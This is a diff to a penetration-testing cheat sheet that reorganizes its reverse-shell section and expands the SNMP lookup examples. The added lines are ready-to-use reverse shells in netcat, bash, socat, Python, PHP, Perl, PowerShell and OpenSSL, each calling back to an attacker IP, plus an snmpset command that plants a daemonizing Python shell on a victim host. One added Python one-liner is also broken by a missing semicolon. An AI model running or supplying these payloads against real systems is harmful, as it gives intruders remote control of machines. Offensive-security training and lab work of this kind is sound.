@@ -67,16 +67,6 @@ Other great cheetsheets:
   - [4.6. Reverse Shells](#46-reverse-shells)
     - [4.6.1. Covering your tracks](#461-covering-your-tracks)
     - [4.6.2. Running a detached/daeminized process on Linux](#462-running-a-detacheddaeminized-process-on-linux)
-    - [4.6.3. Netcat Listener](#463-netcat-listener)
-    - [4.6.4. Socat Listener](#464-socat-listener)
-    - [4.6.5. Bash Reverse Shell](#465-bash-reverse-shell)
-    - [4.6.6. Netcat Reverse Shell](#466-netcat-reverse-shell)
-    - [4.6.7. Socat Reverse Shell](#467-socat-reverse-shell)
-    - [4.6.8. Python Reverse Shell](#468-python-reverse-shell)
-    - [4.6.9. PHP Reverse Shell](#469-php-reverse-shell)
-    - [4.6.10. Perl Reverse Shell](#4610-perl-reverse-shell)
-    - [4.6.11. Powershell Reverse Shell](#4611-powershell-reverse-shell)
-    - [4.6.12. OpenSSL Encrypted Reverse Shell](#4612-openssl-encrypted-reverse-shell)
   - [4.7. Encryption](#47-encryption)
     - [4.7.1. Create self-signed SSL/TLS certificate](#471-create-self-signed-ssltls-certificate)
     - [4.7.2. Decrypting files with GPG](#472-decrypting-files-with-gpg)
@@ -748,17 +738,38 @@ Look [here](https://www.rapid7.com/blog/post/2016/05/05/snmp-data-harvesting-dur
 Exploring MIBs with [snmptranslate](https://net-snmp.sourceforge.io/tutorial/tutorial-5/commands/snmptranslate.html):
 
 ```sh
-# convert abbreviated OID to numeric
+# look up numeric OID to get abbreviated name
+snmptranslate .1.3.6.1.2.1.1.3.0
+snmptranslate -m +ALL .1.3.6.1.2.1.1.3.0
+
+# look up OID node name without fully-qualified path (random access)
+snmptranslate -IR sysUpTime.0
+
+# convert abbreviated OID to numeric (dotted-decimal)
 snmptranslate -On SNMPv2-MIB::sysDescr.0
 
 # convert abbreviated OID to dotted-text
 snmptranslate -Of SNMPv2-MIB::sysDescr.0
+# convert numeric (dotted-decimal) to dotted-text
+snmptranslate -m +ALL -Of .1.3.6.1.2.1.1.1.0
 
 # get description/extended info about OID node
 snmptranslate -Td SNMPv2-MIB::sysDescr.0
+# same for numeric
+snmptranslate -m +ALL -Td .1.3.6.1.2.1.1.1.0
 
 # get tree view of subset of MIB tree
 snmptranslate -Tp -IR system
+
+# look up OID by regex (best match)
+snmptranslate -Ib 'sys.*ime'
+
+#  To get a list of all the nodes that match a given pattern, use the -TB flag:
+snmptranslate -TB 'vacm.*table'
+
+# find out what directories are searched for MIBS:
+net-snmp-config --default-mibdirs # only if installed
+snmptranslate -Dinit_mib .1.3 2>&1 |grep MIBDIR
 ```
 
 Also search for OID info at [http://www.oid-info.com/](http://www.oid-info.com/basic-search.htm)
@@ -782,7 +793,7 @@ Easy library to do this: [https://github.com/mxrch/snmp-shell.git](https://githu
 
 ```sh
 # manually create reverse shell (update listener IP)
-snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp"' = createAndGo 'nsExtendCommand."derp"' = /usr/bin/python3 'nsExtendArgs."derp"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.14\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
+snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp"' = createAndGo 'nsExtendCommand."derp"' = /usr/bin/python3 'nsExtendArgs."derp"' = '-c "import sys,socket,os,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection((\"10.10.14.14\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")"'
 
 # trigger reverse shell by reading the OID
 snmpwalk -v2c -c private $VICTIM_IP NET-SNMP-EXTEND-MIB::nsExtendObjects
@@ -1698,6 +1709,107 @@ Simple one-liner web shells for when you can drop/modify a local php file:
 - [Pentest Monkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - [Reverse Shell Generator](https://www.revshells.com/)
 
+Always start your **Netcat Listener** first!
+
+```sh
+nc -vlnp LISTEN_PORT
+# on mac, exclude the "-p" flag
+```
+
+**Netcat Reverse Shell**
+
+```sh
+# if netcat has the -e flag:
+nc -e /bin/sh 192.168.119.144 443
+
+# if no -e flag:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.144 443 >/tmp/f
+```
+
+**Bash Reverse Shell**
+
+```sh
+# only works on Linux
+bash -i >& /dev/tcp/LISTEN_IP/443 0>&1
+```
+
+**Socat Listener**
+
+Great to support full tty and/or encryption. See Socat Reverse Shell (next).
+
+```sh
+# full tty over TCP
+# "-d -d" prints fatal, error, warning, and notice messages
+socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:LISTEN_PORT
+
+# no tty, plaintext over TCP
+socat -d -d TCP-LISTEN:LISTEN_PORT STDOUT
+
+# full tty, encrypted with SSL (needs socat reverse shell using OPENSSL)
+socat -d -d file:`tty`,raw,echo=0 OPENSSL-LISTEN:LISTEN_PORT,cert=mycert.pem,verify=0,fork
+```
+
+Note: to generate `mycert.pem` see [these instructions](#451-create-self-signed-ssltls-certificate)
+
+
+**Socat Reverse Shell**
+
+Use with Socat Listener (previous)
+
+```sh
+# with full tty
+socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP:192.168.119.144:443
+
+# no tty, text only
+socat EXEC:/bin/bash TCP:192.168.119.144:443
+
+# full tty, encrypted with SSL (needs socat listener uing OPENSSL-LISTEN)
+socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:192.168.119.144:443,verify=0
+```
+
+**Python Reverse Shell**
+
+```sh
+python -c 'import os,socket,pty;s=socket.create_connection(("192.168.119.144",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+
+# daemonizing shell for *nix hosts
+python -c 'import os,sys,socket,pty;os.fork() and sys.exit();os.setsid()os.fork() and sys.exit();s=socket.create_connection(("192.168.119.144",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+```
+
+
+**PHP Reverse Shell**
+
+```sh
+# may have to try different socket numbers besides 3 (4,5,6...)
+php -r '$sock=fsockopen("192.168.119.144",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+**Perl Reverse Shell**
+
+```sh
+perl -e 'use Socket;$i="192.168.119.144";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+**Powershell Reverse Shell**
+
+Invoke from `cmd` with `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...`
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient("192.168.119.144",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+**OpenSSL Encrypted Reverse Shell**
+
+```sh
+# generate key on server
+openssl req -nodes -x509 -newkey rsa:2048 -days 365 -out cert.pem -keyout key.pem -batch
+# Start server listener
+sudo openssl s_server -accept 443 -key key.pem -cert cert.pem
+
+# Client-side reverse shell
+rm -f /tmp/f; mkfifo /tmp/f && openssl s_client -connect SERVER_IP:443 -quiet < /tmp/f 2>/dev/null | /bin/sh 2>&0 > /tmp/f &
+```
+
 ### 4.6.1. Covering your tracks
 
 When you connect via a reverse/bind shell, your commands get saved in the
@@ -1725,99 +1837,6 @@ Still, you can accomplish creating a daemonized process by using sub-shells:
 
 ```sh
 ( ( while true; do echo "insert reverse shell cmd here"; sleep 5; done &) &)
-```
-
-### 4.6.3. Netcat Listener
-
-```sh
-nc -vlnp LISTEN_PORT
-# on mac, exclude the "-p" flag
-```
-
-### 4.6.4. Socat Listener
-
-```sh
-# full tty over TCP
-# "-d -d" prints fatal, error, warning, and notice messages
-socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:LISTEN_PORT
-
-# no tty, plaintext over TCP
-socat -d -d TCP-LISTEN:LISTEN_PORT STDOUT
-
-# full tty, encrypted with SSL (needs socat reverse shell using OPENSSL)
-socat -d -d file:`tty`,raw,echo=0 OPENSSL-LISTEN:LISTEN_PORT,cert=mycert.pem,verify=0,fork
-```
-
-Note: to generate `mycert.pem` see [these instructions](#451-create-self-signed-ssltls-certificate)
-
-### 4.6.5. Bash Reverse Shell
-
-```sh
-# only works on Linux
-bash -i >& /dev/tcp/LISTEN_IP/443 0>&1
-```
-
-### 4.6.6. Netcat Reverse Shell
-
-```sh
-# if netcat has the -e flag:
-nc -e /bin/sh 192.168.119.144 443
-
-# if no -e flag:
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.144 443 >/tmp/f
-```
-
-### 4.6.7. Socat Reverse Shell
-
-```sh
-# with full tty
-socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP:192.168.119.144:443
-
-# no tty, text only
-socat EXEC:/bin/bash TCP:192.168.119.144:443
-
-# full tty, encrypted with SSL (needs socat listener uing OPENSSL-LISTEN)
-socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:192.168.119.144:443,verify=0
-```
-
-### 4.6.8. Python Reverse Shell
-
-```sh
-python -c 'import os,socket,pty;s=socket.create_connection(("192.168.119.144",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
-```
-
-
-### 4.6.9. PHP Reverse Shell
-
-```sh
-# may have to try different socket numbers besides 3 (4,5,6...)
-php -r '$sock=fsockopen("192.168.119.144",443);exec("/bin/sh -i <&3 >&3 2>&3");'
-```
-
-### 4.6.10. Perl Reverse Shell
-
-```sh
-perl -e 'use Socket;$i="192.168.119.144";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-```
-
-### 4.6.11. Powershell Reverse Shell
-
-Invoke from `cmd` with `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...`
-
-```powershell
-$client = New-Object System.Net.Sockets.TCPClient("192.168.119.144",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-```
-
-### 4.6.12. OpenSSL Encrypted Reverse Shell
-
-```sh
-# generate key on server
-openssl req -nodes -x509 -newkey rsa:2048 -days 365 -out cert.pem -keyout key.pem -batch
-# Start server listener
-sudo openssl s_server -accept 443 -key key.pem -cert cert.pem
-
-# Client-side reverse shell
-rm -f /tmp/f; mkfifo /tmp/f && openssl s_client -connect SERVER_IP:443 -quiet < /tmp/f 2>/dev/null | /bin/sh 2>&0 > /tmp/f &
 ```
 
 ## 4.7. Encryption
